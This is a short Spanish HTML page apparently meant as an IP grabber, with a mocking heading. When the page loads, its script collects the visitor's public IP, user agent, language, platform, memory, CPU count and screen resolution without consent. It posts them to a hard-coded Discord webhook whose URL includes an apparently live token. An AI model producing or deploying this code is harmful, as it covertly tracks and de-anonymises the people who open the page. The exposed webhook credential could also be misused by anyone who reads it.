<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Detector de visitante</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: sans-serif;
      padding: 1em;
    }
    pre {
      background: #f4f4f4;
      padding: 1em;
      white-space: pre-wrap;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <h1>Espiando al tu mama...</h1>
  <pre id="log">Recolectando datos...</pre>

  <script>
    async function enviarAWebhookDiscord(datos) {
      const embed = {
        title: "Nuevo visitante",
        color: 0x00ffff,
        fields: Object.entries(datos).map(([key, value]) => ({
          name: key,
          value: String(value),
          inline: false
        })),
        timestamp: new Date().toISOString()
      };

      const payload = {
        username: "Visitante Web",
        embeds: [embed]
      };

      const response = await fetch("https://discord.com/api/webhooks/1370677537323356221/-BaECwj6b7G2rdckunAUfeWhsNOWm3q3E0cRWQUhuspzgdTBUl6ggdTJEc7dwQ8lOEdt", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      return response.ok;
    }

    async function obtenerYEnviarDatos() {
      const log = document.getElementById("log");

      try {
        const ipResp = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResp.json();

        const datos = {
          IP: ipData.ip,
          "User Agent": navigator.userAgent,
          Idioma: navigator.language,
          Plataforma: navigator.platform,
          Memoria: navigator.deviceMemory || "no disponible",
          "Núcleos CPU": navigator.hardwareConcurrency || "no disponible",
          Resolución: `${screen.width}x${screen.height}`,
          Fecha: new Date().toLocaleString()
        };

        log.textContent = "Datos recolectados:\n\n" + JSON.stringify(datos, null, 2);

        const enviado = await enviarAWebhookDiscord(datos);
        log.textContent += "\n\nResultado del envío: " + (enviado ? "Enviado correctamente a Discord" : "Error al enviar");
      } catch (err) {
        log.textContent += "\n\nError:\n" + err;
      }
    }

    obtenerYEnviarDatos();
  </script>
</body>
</html>
